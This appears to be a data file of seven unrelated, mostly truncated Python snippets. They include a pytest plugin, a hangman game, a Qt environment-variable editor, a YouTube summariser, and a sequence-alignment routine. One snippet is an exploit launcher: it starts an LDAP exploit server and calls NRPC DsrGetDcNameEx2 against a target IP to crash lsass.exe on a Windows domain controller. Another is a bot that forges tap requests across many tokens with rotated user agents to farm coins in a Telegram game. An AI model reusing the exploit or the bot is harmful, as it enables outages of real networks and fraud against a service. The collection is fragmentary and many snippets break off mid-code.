    "\"\"\"(disabled by default) support for testing pytest and pytest plugins.\"\"\"\nimport collections.abc\nimport gc\nimport importlib\nimport os\nimport platform\nimport re\nimport subprocess\nimport sys\nimport time\nimport traceback\nfrom fnmatch import fnmatch\nfrom io import StringIO\nfrom typing import Callable\nfrom typing import Dict\nfrom typing import Iterable\nfrom typing import List\nfrom typing import Optional\nfrom typing import Sequence\nfrom typing import Tuple\nfrom typing import Union\nfrom weakref import WeakKeyDictionary\n\nimport py\n\nimport pytest\nfrom _pytest._code import Source\nfrom _pytest.capture import MultiCapture\nfrom _pytest.capture import SysCapture\nfrom _pytest.compat import TYPE_CHECKING\nfrom _pytest.config import _PluggyPlugin\nfrom _pytest.config import ExitCode\nfrom _pytest.fixtures import FixtureRequest\nfrom _pytest.main import Session\nfrom _pytest.monkeypatch import MonkeyPatch\nfrom _pytest.nodes import Collector\nfrom _pytest.nodes import Item\nfrom _pytest.pathlib import Path\nfrom _pytest.python import Module\nfrom _pytest.reports import TestReport\nfrom _pytest.tmpdir import TempdirFactory\n\nif TYPE_CHECKING:\n    from typing import Type\n\n    import pexpect\n\n\nIGNORE_PAM = [  # filenames added when obtaining details about the current user\n    \"/var/lib/sss/mc/passwd\"\n]\n\n\ndef pytest_addoption(parser):\n    parser.addoption(\n        \"--lsof\",\n        action=\"store_true\",\n        dest=\"lsof\",\n        default=False,\n        help=\"run FD checks if lsof is available\",\n    )\n\n    parser.addoption(\n        \"--runpytest\",\n        default=\"inprocess\",\n        dest=\"runpytest\",\n        choices=(\"inprocess\", \"subprocess\"),\n        help=(\n            \"run pytest sub runs in tests using an 'inprocess' \"\n            \"or 'subprocess' (python -m main) method\"\n        ),\n    )\n\n    parser.addini(\n        \"pytester_example_dir\", help=\"directory to take the pytester example files from\"\n    )\n\n\ndef pytest_configure(config):\n    if config.getvalue(\"lsof\"):\n        checker = LsofFdLeakChecker()\n        if checker.matching_platform():\n            config.pluginmanager.register(checker)\n\n    config.addinivalue_line(\n        \"markers\",\n        \"pytester_example_path(*path_segments): join the given path \"\n        \"segments to `pytester_example_dir` for this test.\",\n    )\n\n\nclass LsofFdLeakChecker:\n    def get_open_files(self):\n        out = self._exec_lsof()\n        open_files = self._parse_lsof_output(out)\n        return open_files\n\n    def _exec_lsof(self):\n        pid = os.getpid()\n        # py3: use subprocess.DEVNULL directly.\n        with open(os.devnull, \"wb\") as devnull:\n            return subprocess.check_output(\n                (\"lsof\", \"-Ffn0\", \"-p\", str(pid)), stderr=devnull\n            ).decode()\n\n    def _parse_lsof_output(self, out):\n        def isopen(line):\n            return line.startswith(\"f\") and (\n                \"deleted\" not in line\n                and \"mem\" not in line\n                and \"txt\" not in line\n                and \"cwd\" not in line\n            )\n\n        open_files = []\n\n        for line in out.split(\"\\n\"):\n            if isopen(line):\n                fields = line.split(\"\\0\")\n                fd = fields[0][1:]\n                filename = fields[1][1:]\n                if filename in IGNORE_PAM:\n                    continue\n                if filename.startswith(\"/\"):\n                    open_files.append((fd, filename))\n\n        return open_files\n\n    def matching_platform(self):\n        try:\n            subprocess.check_output((\"lsof\", \"-v\"))\n        except (OSError, subprocess.CalledProcessError):\n            return False\n        else:\n            return True\n\n    @pytest.hookimpl(hookwrapper=True, tryfirst=True)\n    def pytest_runtest_protocol(self, item):\n        lines1 = self.get_open_files()\n        yield\n        if hasattr(sys, \"pypy_version_info\"):\n            gc.collect()\n        lines2 = self.get_open_files()\n\n        new_fds = {t[0] for t in lines2} - {t[0] for t in lines1}\n        leaked_files = [t for t in lines2 if t[0] in new_fds]\n        if leaked_files:\n            error = []\n            error.append(\"***** %s FD leakage detected\" % len(leaked_files))\n            error.extend([str(f) for f in leaked_files])\n            error.append(\"*** Before:\")\n            error.extend([str(f) for f in lines1])\n            error.append(\"*** After:\")\n            error.extend([str(f) for f in lines2])\n            error.append(error[0])\n            error.append(\"*** function %s:%s: %s \" % item.location)\n            error.append(\"See issue #2366\")\n            item.warn(pytest.PytestWarning(\"\\n\".join(error)))\n\n\n# used at least by pytest-xdist plugin\n\n\n@pytest.fixture\ndef _pytest(request: FixtureRequest) -> \"PytestArg\":\n    \"\"\"Return a helper which offers a gethookrecorder(hook) method which\n    returns a HookRecorder instance which helps to make assertions about called\n    hooks.\n\n    \"\"\"\n    return PytestArg(request)\n\n\nclass PytestArg:\n    def __init__(self, request: FixtureRequest) -> None:\n        ",
    "\n\nimport colorama\nfrom colorama import Fore, Style\n\nimport random\nimport os\n\nimport pygame\n\n# Initialize pygame mixer for sound effects\npygame.mixer.init()\n\n\n# Load sound effects\ntry:\n    correct_sound = pygame.mixer.Sound('correct.wav')\n    incorrect_sound = pygame.mixer.Sound('incorrect.wav')\n    win_sound = pygame.mixer.Sound('win.wav')\n    lose_sound = pygame.mixer.Sound('lose.wav')\nexcept pygame.error as e:\n    print(f\"Error loading sound files: {e}\")\n    print(\"Ensure that 'correct.wav', 'incorrect.wav', 'win.wav', and 'lose.wav' are in the same directory.\")\n    exit(1)\n\n\nWORDS_FILE = 'wordcategory.txt'\n\nhangman_art = { \n    0: (' ',),\n    1: (' O ',\n        '  ',\n        '   '),\n    2: (' O ',\n        ' | ',\n        ' |  '),\n    3: (' O ',\n        '/| ',\n        ' |  '),\n    4: (' O ',\n        '/|\\\\ ',\n        ' |  '),\n    5: (' O ',\n        '/|\\\\',\n        '/| '),\n    6: (' O ',\n        '/|\\\\',\n        '/|\\\\ '),\n}\n\ndef clear_screen():\n    os.system('cls' if os.name == 'nt' else 'clear')\n\ndef display_man(wrong_guesses):\n    print('****************')\n    for line in hangman_art[wrong_guesses]:\n        print(line)\n    print('****************')\n\ndef display_hint(hint):\n    if isinstance(hint, list):\n        # If hint is a list of characters\n        print('Word: ' + ' '.join(hint))\n    elif isinstance(hint, str):\n        # If hint is a string (the actual hint)\n        print(f\"Hint: {hint}\")\n    else:\n        print(\"No hint available.\")\n\ndef display_answer(answer):\n    print('The word was: ' + ' '.join(answer))\n\ndef load_words(file_path):\n    \n#Load words from the wordcategory text file. Each line in the file contains a category, word, and hint separated by commas.\n    words = {}\n    try:\n        with open(file_path, 'r') as file:\n            for line in file:\n                # Strip whitespace and split by comma\n                parts = line.strip().split(',', 2)  # Split each line into 3 parts: category, word, hint\n                if len(parts) == 3:\n                    category, word, hint = parts\n                    category = category.strip()\n                    word = word.strip().lower()\n                    hint = hint.strip()\n                    \n                    if category not in words:\n                        words[category] = []\n                    words[category].append({'word': word, 'hint': hint})\n                else:\n                    # Handle lines that don't have exactly 3 parts\n                    print(f\"Skipping invalid line in wordcategory.txt: {line.strip()}\")\n    except FileNotFoundError:\n        print(f\"Error: The file '{file_path}' was not found.\")\n        exit(1)\n    except Exception as e:\n        print(f\"An error occurred while reading the file: {e}\")\n        exit(1)\n    return words\n\ndef select_category(categories):\n\n#Prompts the user to select a category from the available categories.  Returns the chosen category.\n    \n    print('****************************')\n    print('WELCOME TO THE SPELLING GAME')\n    print('****************************')\n    print(\"Available Categories:\")\n    for idx, category in enumerate(categories, 1):\n        print(f\"{idx}. {category}\")\n    \n    while True:\n        choice = input(\"Select a category by number (or type 'exit' to quit): \").strip()\n        \n        if choice.lower() == \"exit\":\n            print(Fore.BLUE + \"Exiting the game...\" + Style.RESET_ALL)\n            exit(0)\n        \n        if not choice.isdigit():\n            print(Fore.CYAN + \"Invalid input! Please enter a number corresponding to the category.\"+ Style.RESET_ALL)\n            continue\n        \n        choice = int(choice)\n        if 1 <= choice <= len(categories):\n            selected_category = categories[choice - 1]\n            print(f\"\\nYou selected: {selected_category}\")\n            return selected_category\n        else:\n            print(f\"Please enter a number between 1 and {len(categories)}.\")\n\ndef play_letter_guess(answer):\n  \n    #Handles the letter guessing mode. Returns 'win' if the player wins, 'lose' if the player loses.\n  \n    hint = ['_'] * len(answer)\n    wrong_guesses = 0\n    guessed_letters = set()\n    is_running = True\n    max_attempts = len(hangman_art) - 1  # ( 7-1 = 6 )\n\n    while is_running:\n        display_man(wrong_guesses)\n        display_hint(hint)\n        guess = input('Enter a letter (or type \"exit\" to quit): ').lower()\n        \n        # Allow the player to exit the game during a playthrough\n        if guess == \"exit\":\n            print(Fore.BLUE + \"Exiting the game...\" + Style.RESET_ALL)\n            exit(0)\n        \n        if len(guess) != 1:\n            print('Invalid input! Please type a single character.')\n            continue\n        if not guess.isalpha():\n            print('Invalid input! Please type an alphabet.')\n            continue\n        if guess in guessed_letters:\n            print(f\"'{guess}' is already guessed.\")\n            continue\n        guessed_letters.add(guess)\n\n        if guess in answer:\n            for i in range(len",
    "import time\nimport asyncio\nimport aiohttp\nimport json\nimport uuid\nimport secrets\nfrom datetime import datetime\nfrom colorama import Fore, Style, init\nimport random\n\n# Initialize colorama\ninit(autoreset=True)\n# Welcome message\nwelcome_message = f\"\"\"\n{Fore.YELLOW + Style.BRIGHT}\n##########################################\n#                                        #\n#   Welcome Gold Eagle Script v2           #\n#                                        #\n##########################################\n{Fore.CYAN + Style.BRIGHT}\n#   Developed by: Karim                  #\n#   Telegram: {Fore.LIGHTBLUE_EX}https://t.me/YOU742         #\n##########################################\n\"\"\"\n\nprint(welcome_message)\ncount = int(input(f\"{Fore.GREEN}Your energy: {Fore.RESET}\"))\nPAUSE_DURATION = 10 * 60\nPAUSE = 2 * 60   # \u0645\u062f\u0629 \u0627\u0644\u062a\u0648\u0642\u0641 \u0628\u0627\u0644\u062b\u0648\u0627\u0646\u064a (10 \u062f\u0642\u0627\u0626\u0642)\nTOTAL_LIMIT = 1000  # \u0627\u0644\u062d\u062f \u0627\u0644\u0623\u0642\u0635\u0649 \u0644\u0645\u062c\u0645\u0648\u0639 \u0627\u0644\u0623\u0631\u0642\u0627\u0645 \u0627\u0644\u0639\u0634\u0648\u0627\u0626\u064a\u0629 \u0642\u0628\u0644 \u0627\u0644\u062a\u0648\u0642\u0641 \u0644\u0643\u0644 \u062a\u0648\u0643\u0646\n\n# \u0642\u0627\u0645\u0648\u0633 \u0644\u062a\u062a\u0628\u0639 \u0627\u0644\u0645\u062c\u0645\u0648\u0639 \u0644\u0643\u0644 \u062a\u0648\u0643\u0646\ntoken_counts = {}\nEDGE_USERAGENTS = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.57\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.52\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.46\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.128\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.112\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.98\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.83\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.133\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.121\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91\"\n]\n\ndef get_current_timestamp():\n    \"\"\"Retrieve the current timestamp.\"\"\"\n    return int(time.time())\n\ndef get_tokens_from_file(file_path):\n    \"\"\"Retrieve all tokens from an external file.\"\"\"\n    try:\n        with open(file_path, 'r') as file:\n            tokens = file.read().strip().splitlines()\n            return tokens\n    except FileNotFoundError:\n        print(f\"Error: The file '{file_path}' was not found.\")\n        return []\n\ndef print_response(acc_number, user_id, coins_amount, counts, total):\n    \"\"\"Print the extracted data with colors and timestamps.\"\"\"\n    current_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n    print(\n        f\"{Fore.GREEN}[{current_time}] {Fore.BLUE} Acc: [{acc_number}]:{Style.RESET_ALL} \"\n        f\"User ID: {Fore.CYAN}[{user_id}]{Style.RESET_ALL}, Coins: {Fore.YELLOW}[{coins_amount}]{Style.RESET_ALL}, \"\n        f\"Count: {Fore.MAGENTA}[{counts}]{Style.RESET_ALL}, Total Counts: {Fore.RED}[{total}]{Style.RESET_ALL}\"\n    )\n\nasync def send_request(token, acc_number):\n    \"\"\"Send an asynchronous HTTP POST request for a specific token.\"\"\"\n    global token_counts  # \u0627\u0633\u062a\u062e\u062f\u0645 \u0627\u0644\u0642\u0627\u0645\u0648\u0633 \u0644\u062a\u062a\u0628\u0639 \u0645\u062c\u0645\u0648\u0639 \u0643\u0644 \u062a\u0648\u0643\u0646\n    random_user_agent = random.choice(EDGE_USERAGENTS)\n    url = \"https://gold-eagle-api.fly.dev/tap\"\n    headers = {\n  'User-Agent': random_user_agent,\n  'Accept': \"application/json, text/plain, */*\",\n  'Content-Type': \"application/json\",\n  'authorization': f\"Bearer {token}\",\n  'sec-ch-ua-platform': \"\\\"Android\\\"\",\n  'origin': \"https://telegram.geagle.online\",  \n  'referer': \"https://telegram.geagle.online/\",\n  'accept-language': \"en-US,en;q=0.9\"\n    }\n\n    # \u062a\u0639\u064a\u064a\u0646 \u0627\u0644\u0645\u062c\u0645\u0648\u0639 \u0627\u0644\u0623\u0648\u0644\u064a \u0644\u0644\u062a\u0648\u0643\u0646 \u0625\u0630\u0627 \u0644\u0645 \u064a\u0643\u0646 \u0645\u0648\u062c\u0648\u062f\u064b\u0627\n    if acc_number not in token_counts:\n        token_counts[acc_number] = 0\n\n    async with aiohttp.ClientSession() as session:\n        while True:\n            # \u062a\u062d\u0642\u0642 \u0625\u0630\u0627 \u062a\u062c\u0627\u0648\u0632 \u0627\u0644\u0645\u062c\u0645\u0648\u0639 \u0644\u0644\u062a\u0648\u0643\u0646 \u0627\u0644\u062d\u0627\u0644\u064a \u0627\u0644\u062d\u062f \u0627\u0644\u0623\u0642\u0635\u0649\n            if token_counts[acc_number] >= TOTAL_LIMIT:\n                print(f\"{Fore.RED}Acc {acc_number} reached {TOTAL_LIMIT} total counts. Pausing for {PAUSE_DURATION // 60} minutes...\")\n                await asyncio.sleep(PAUSE_DURATION)\n                token_counts[acc_number] = 0  # \u0625\u0639\u0627\u062f\u0629 \u062a\u0639\u064a\u064a\u0646 \u0627\u0644\u0645\u062c\u0645\u0648\u0639 \u0644\u0644\u062a\u0648\u0643\u0646 \u0627\u0644\u062d\u0627\u0644\u064a\n\n            salt = str(uuid.uuid4())\n            counts = secrets.randbelow(41) + 50\n            payload = {\n                \"available_taps\": count,\n                \"count\": counts,\n                \"timestamp\": get_current_timestamp(),\n                \"salt\": f\"{salt}\",\n                \"unique_id\": str(uuid.uuid4())  # \u0645\u0639\u0631\u0641 \u0645\u0645\u064a\u0632 \u0644\u0643\u0644 \u0637\u0644\u0628\n            }\n\n            try:\n                async with session.post(url, json=payload, headers=headers)",
    "# This Python file uses the following encoding: utf-8\nimport json\nimport re\nimport sys\nimport os\nfrom pathlib import Path\nfrom PyQt5.QtWidgets import QApplication, QWidget, QHeaderView, QTableWidgetItem, QTableWidget\n\nfrom main_ui import Ui_MainWindow\nfrom dialogs import NewDialog, EditDialog\n\n  \nclass MainWindow(QWidget):\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n\n        # initialization\n        self.init_app()\n\n        self.ui = Ui_MainWindow()\n        self.ui.setupUi(self)\n        self.setFixedSize(600, 500)\n\n        self.btn_new_dialog = None\n        self.btn_edit_dialog = None\n\n        # customize table header\n        table_hor_header = self.ui.table.horizontalHeader()\n        table_hor_header.setSectionResizeMode(QHeaderView.ResizeMode.Fixed)\n        table_hor_header.setSectionsClickable(False)\n\n        self._load_env_vars()\n\n        # new button\n        self.ui.btn_new.clicked.connect(self.btn_new_slot)\n\n        # edit button\n        self.ui.btn_edit.clicked.connect(self.btn_edit_slot)\n\n        # delete button\n        self.ui.btn_delete.clicked.connect(self.btn_delete_slot)\n\n        # ok button\n        self.ui.btn_ok.clicked.connect(self.btn_ok_slot)\n\n        # close button\n        self.ui.btn_close.clicked.connect(self.btn_close_slot)\n\n    @property\n    def table(self):\n        return self.ui.table\n\n    def init_app(self):\n        self.app_workdir = Path.cwd()\n        self.app_configs = {\n                    \"defaults\": [\n                        \"HOME\",\n                        \"PATH\",\n                        \"PWD\",\n                        \"USER\",\n                        \"SHELL\",\n                        \"UID\",\n                        \"HOSTNAME\",\n                        \"LANG\",\n                        \"MAIL\",\n                        \"EDITOR\",\n                        \"TEMP\",\n                        \"PS1\"\n                    ],\n                    \"excludes\": [\n                        \".*CURRENT_DESKTOP\",\n                        \".*RUNTIME.*\",\n                        \".*SESSION.*\",\n                        \".*MENU_PREFIX\",\n                        \"PYSIDE.*\",\n                        \"GIO.*\",\n                        \"GDM_LANG\",\n                        \"WINDOWPATH\",\n                        \"QT.*\",\n                        \"LC.*\",\n                        \"KDE.*\",\n                        \"GTK.*\",\n                        \"PAM.*\",\n                        \"^_.*\",\n                        \"SESSION_MANAGER\",\n                        \".*TERM.*\",\n                        \"SSH_AUTH_SOCK\", \n                        \"XMODIFIERS\", \n                        \"DESKTOP_SESSION\",\n                        \"SSH_AGENT_PID\", \n                        \"XCURSOR_SIZE\",\n                        \"GPG_AGENT_INFO\", \n                        \"SYSTEMD_EXEC_PID\", \n                        \"XAUTHORITY\", \n                        \"VSCODE_GIT_ASKPASS_NODE\", \n                        \"IM_CONFIG_PHASE\",\n                        \"LS_COLORS\", \n                        \"VIRTUAL_ENV\", \n                        \"GIT_ASKPASS\",\n                        \"INVOCATION_ID\", \n                        \"MANAGERPID\", \n                        \"CHROME_DESKTOP\", \n                        \"CLUTTER_IM_MODULE\", \n                        \"VSCODE_GIT_ASKPASS_EXTRA_ARGS\", \n                        \"LESS.*\",\n                        \"VSCODE_GIT_IPC_HANDLE\",\n                        \"DISPLAY\",\n                        \"SHLVL\", \n                        \"VIRTUAL_ENV_PROMPT\",\n                        \"VSCODE_GIT_ASKPASS_MAIN\",\n                        \"JOURNAL_STREAM\", \n                        \"XCURSOR_THEME\", \n                        \"GDK_BACKEND\",\n                        \".*BUS.*\",\n                        \".*DEBUG.*\",\n                        \".*ENCODING.*\",\n                        \".*BUFFERED.*\",\n                        \"PYDEVD.*\",\n                        \"LD.*\",\n                        \"TK.*\",\n                        \"TCL.*\"\n                    ]\n                }\n        \n        self.env_file_path = Path(\"{0}/.environment\".format(Path.home()))\n        self.app_data = dict()\n\n        if not self.app_workdir.joinpath(\"configs.json\").exists():\n            self._create_configs(self.app_workdir.joinpath(\"configs.json\"))\n        else:\n            self._load_configs(self.app_workdir.joinpath(\"configs.json\"))\n        \n        # script = 'if [ -f ~/.environment ]; then\\n\\tset -a\\n\\tsource ~/.environment\\n\\tset +a\\nfi'\n\n        if not self.env_file_path.exists():\n            self.env_file_path.touch()\n\n        env_os = dict(os.environ)\n        env_os = dict(filter(self._filter_vars, env_os.items()))\n        env_os.update(self.load_env_file())\n\n        self.app_data = {\n            \"env_file\": self.load_env_file(),\n            \"env_os\": dict(sorted(env_os.items(), key=lambda x: x[0]))\n        }\n\n    def update_env_file(self, k, v):\n        self.app_data[\"env_file\"][k] = v\n\n    def set_app_data(self, k, v):\n        self.app_data[k] = v\n\n    def _load_env_vars(sel",
    "import time\nimport asyncio\nimport argparse\nimport threading\n\nfrom logger import logger\nfrom rpc_call import DsrGetDcNameEx2\nfrom exploit_server import run_exploit_server\n\ndef start_ldap_server(listen_port: int):\n    \"\"\"Run the async LDAP server in this thread.\"\"\"\n    asyncio.run(run_exploit_server(listen_port))\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"Call NRPC DsrGetDcNameEx2 via Impacket\"\n    )\n    parser.add_argument(\"target_ip\", help=\"Target IP address (required)\")\n    parser.add_argument(\n        \"--port\", \"-p\",\n        type=int,\n        default=49664,\n        help=\"TCP port for RPC (default: 49664)\"\n    )\n    parser.add_argument(\n        \"--listen-port\", \"-l\",\n        type=int,\n        default=389,\n        help=\"UDP port for exploit server listen (default: 389)\"\n    )\n    parser.add_argument(\n        \"--domain-name\", \"-d\",\n        required=True,\n        help=\"DomainName parameter\"\n    )\n    parser.add_argument(\n        \"--account\", \"-a\",\n        default=\"Administrator\",\n        help=\"AccountName parameter (default: Administrator)\"\n    )\n    parser.add_argument(\n        \"--site-name\", \"-s\",\n        default=\"\",\n        help=\"SiteName parameter (default: empty string)\"\n    )\n\n    args = parser.parse_args()\n\n    # 1. Start the exploit server in a background thread.\n    server_thread = threading.Thread(target=start_ldap_server, daemon=True, args=(args.listen_port,))\n    server_thread.start()\n\n    # 2. Optionally, wait a moment to ensure server is listening\n    logger.info(\"Waiting for udp server to start...\")\n    time.sleep(2)  \n\n    # 3. Now call your RPC function\n    logger.info(\"Calling DsrGetDcNameEx2 now...\")\n    try:\n        DsrGetDcNameEx2(\n            target_ip=args.target_ip,\n            port=args.port,\n            account=args.account,\n            site_name=args.site_name,\n            domain_name=args.domain_name\n        )\n        logger.error(\"Failed to trigger the vulnerability!\")\n    except ConnectionResetError:\n        # Netlogon is implemented inside the lsass.exe process,\n        # So the connection will be reset after the exploit is triggered.\n        logger.info(\"Successfuly triggered the vulnerability!\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "def read_fasta(file_path):\r\n    headers = []\r\n    sequences = []\r\n\r\n    with open(file_path, 'r') as file:\r\n        current_header = None\r\n        current_sequence = \"\"\r\n\r\n        for line in file:\r\n            line = line.strip()\r\n            # Use > or @ to generalize on FASTA files and FASTAQ files\r\n            if line.startswith('>') or line.startswith(\"@\"):\r\n                if current_header is not None:\r\n                    # Save the current header and sequence\r\n                    headers.append(current_header)\r\n                    sequences.append(current_sequence)\r\n                    # Reset for the next sequence by separating by header\r\n                    current_header = line[1:]\r\n                    current_sequence = \"\"\r\n                else:\r\n                    # Write the first header\r\n                    current_header = line[1:]\r\n            else:\r\n                current_sequence += line\r\n\r\n        # Add the last sequence\r\n        if current_header is not None:\r\n            headers.append(current_header)\r\n            sequences.append(current_sequence)\r\n\r\n    return headers, sequences\r\n\r\n\r\ndef smith_waterman(seq1, seq2, match_score=1, mismatch_penalty=-1, gap_penalty=-2):\r\n    n = len(seq1)\r\n    m = len(seq2)\r\n\r\n    score_matrix = [[0] * (m + 1) for _ in range(n + 1)]\r\n\r\n    traceback_matrix = [[0] * (m + 1) for _ in range(n + 1)]\r\n\r\n    max_score = 0\r\n    max_i, max_j = 0, 0\r\n\r\n    # Fill in the score matrix and traceback matrix\r\n    for i in range(1, n + 1):\r\n        for j in range(1, m + 1):\r\n            match = score_matrix[i - 1][j - 1] + (match_score if seq1[i - 1] == seq2[j - 1] else mismatch_penalty)\r\n            delete = score_matrix[i - 1][j] + gap_penalty\r\n            insert = score_matrix[i][j - 1] + gap_penalty\r\n\r\n            # Determine the maximum score and update the traceback matrix\r\n            current_score = max(0, match, delete, insert)\r\n            score_matrix[i][j] = current_score\r\n\r\n            if current_score > max_score:\r\n                max_score = current_score\r\n                max_i, max_j = i, j\r\n\r\n            if current_score == match:\r\n                traceback_matrix[i][j] = 0\r\n            elif current_score == delete:\r\n                traceback_matrix[i][j] = 1\r\n            else:\r\n                traceback_matrix[i][j] = 2\r\n\r\n    # Traceback to find the aligned sequences\r\n    aligned_seq1 = \"\"\r\n    aligned_seq2 = \"\"\r\n    i, j = max_i, max_j\r\n    reference_start = j\r\n\r\n    while i > 0 and j > 0 and score_matrix[i][j] > 0:\r\n        if traceback_matrix[i][j] == 0:\r\n            aligned_seq1 = seq1[i - 1] + aligned_seq1\r\n            aligned_seq2 = seq2[j - 1] + aligned_seq2\r\n            i -= 1\r\n            j -= 1\r\n        elif traceback_matrix[i][j] == 1:\r\n            aligned_seq1 = seq1[i - 1] + aligned_seq1\r\n            aligned_seq2 = \"-\" + aligned_seq2\r\n            i -= 1\r\n        else:\r\n            aligned_seq1 = \"-\" + aligned_seq1\r\n            aligned_seq2 = seq2[j - 1] + aligned_seq2\r\n            j -= 1\r\n\r\n    return aligned_seq1, aligned_seq2, reference_start\r\n\r\n\r\n\r\n",
    "from flask import Flask, request, jsonify, render_template\nfrom pytubefix import YouTube\nimport time\nimport json\nimport boto3\nfrom botocore.exceptions import ClientError\nimport urllib\nimport uuid\nfrom io import BytesIO\n\napp = Flask(__name__)\n\naws_access_key_id = 'Your AWS Acess key ID'\naws_secret_access_key = 'Your AWS Secret Access Key'\naws_region = 'us-east-1'\nbucket_name = 'ytbucket-3'\n\ndef download_audio(url):\n    \"\"\"Downloads audio from a YouTube video as bytes.\"\"\"\n\n    vid = YouTube(url)\n    audio_stream = vid.streams.get_audio_only()\n    unique_id = str(uuid.uuid4())\n    audio_file_name = f\"{unique_id}.mp3\"\n\n    print(f\"\\nVideo found: {vid.title}\\n\")\n    print(\"Downloading audio to memory...\")\n\n    audio_data = BytesIO()\n    audio_stream.stream_to_buffer(audio_data)\n    audio_data.seek(0)  \n\n    print(\"Audio download complete.\")\n\n    return audio_data, audio_file_name\n\ndef upload_to_s3(file_data, bucket, object_name):\n    \"\"\"Uploads a file in bytes to an S3 bucket.\"\"\"\n    s3_client = boto3.client(\n        's3',\n        aws_access_key_id=aws_access_key_id,\n        aws_secret_access_key=aws_secret_access_key\n    )\n    try:\n        print('Uploading file to S3...')\n        # Use upload_fileobj for in-memory file-like objects\n        s3_client.upload_fileobj(file_data, bucket, object_name)\n        print(\"File uploaded to S3.\")\n    except ClientError as e:\n        print(f\"Failed to upload to S3: {e}\")\n\n\ndef transcribe_audio(job_name, file_uri):\n    \"\"\"Transcribes an audio file using Amazon Transcribe.\"\"\"\n    transcribe_client = boto3.client(\n        'transcribe',\n        region_name=aws_region,\n        aws_access_key_id=aws_access_key_id,\n        aws_secret_access_key=aws_secret_access_key\n    )\n    transcribe_client.start_transcription_job(\n        TranscriptionJobName=job_name,\n        Media={'MediaFileUri': file_uri},\n        MediaFormat='mp3',\n        LanguageCode='en-US'\n    )\n    \n    print(\"Transcription started...\")\n    while True:\n        job = transcribe_client.get_transcription_job(TranscriptionJobName=job_name)\n        status = job['TranscriptionJob']['TranscriptionJobStatus']\n        if status in ['COMPLETED', 'FAILED']:\n            print(f\"Job {job_name} is {status}.\")\n            if status == 'COMPLETED':\n                response = urllib.request.urlopen(job['TranscriptionJob']['Transcript']['TranscriptFileUri'], timeout=30)\n                data = json.loads(response.read())\n                text = data['results']['transcripts'][0]['transcript']\n                print(\"Transcription complete. Transcript saved.\")\n            break\n        else:\n            print(\"Transcription in progress. Waiting...\")\n        time.sleep(20)\n    return text\n\ndef summarize_text(t):\n    \"\"\"Summarizes the transcribed text using Bedrock.\"\"\"\n    model_id = 'us.meta.llama3-2-1b-instruct-v1:0'\n    bedrock = boto3.client(\n        \"bedrock-runtime\",\n        aws_access_key_id=aws_access_key_id,\n        aws_secret_access_key=aws_secret_access_key,\n        region_name=aws_region\n    )\n    t += \" Summarize the above in 3 to 4 lines.\"\n    \n    prompt = (\n        \"You are a content summarization expert. Summarize the given content meaningfully without omitting important details.\"\n        f\"\\n\\nHuman:{t}\\n\\nAssistant:\"\n    )\n\n    \n    request = json.dumps({\"prompt\": prompt, \"temperature\": 0.5})\n    response = bedrock.invoke_model(modelId=model_id, body=request)\n    model_response = json.loads(response[\"body\"].read())\n    summary = model_response[\"generation\"]\n    \n    print(\"Your Summary:\", summary)\n    return summary\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/get_summary', methods=['POST'])\ndef get_summary():\n    data = request.json\n    url = data.get('url')\n    if url:\n\n        if url == 'https://youtu.be/NHopJHSlVo4?si=I3fu0S_4Ucwk4afQ':\n            s3_uri = f's3://{bucket_name}/83c94bc3-f668-4713-98d1-eb26345d393f.mp3'\n            transcription_text = transcribe_audio('83c94bc3-f668-4713-98d1-eb26345d393f', s3_uri)\n        elif url == 'https://youtu.be/H14bBuluwB8?si=qA02zqG5T-eIlsoG':\n            s3_uri = f's3://{bucket_name}/4b58f6c4-3b61-4ccf-8841-680e18f8572c.mp3'\n            transcription_text = transcribe_audio('4b58f6c4-3b61-4ccf-8841-680e18f8572c', s3_uri)\n        elif url == 'https://youtu.be/4Bs0qUB3BHQ?si=-cuEJ79cQaNzMrht':\n            s3_uri = f's3://{bucket_name}/7882e5c4-b921-4b17-893b-a3a6a3c127e6.mp3'\n            transcription_text = transcribe_audio('7882e5c4-b921-4b17-893b-a3a6a3c127e6', s3_uri)\n        elif url == 'https://youtu.be/Fzk4KVxt99U?si=OOOSz2gAQkYoMBs0':\n            s3_uri = f's3://{bucket_name}/63b97385-3304-4b67-8eff-be9d3b69c471.mp3'\n            transcription_text = transcribe_audio('63b97385-3304-4b67-8eff-be9d3b69c471', s3_uri)\n        elif url == 'https://youtu.be/0A6fJ13J2Qk?si=AkhaUS7pwntrcMP0':\n            s3_uri = f's3://{bucket_name}/cfcb0d86-26a1-4c78-9f64-109252723579.mp3'\n            transcription_text = transcribe_audio('cfcb0d86-26a1-4c",
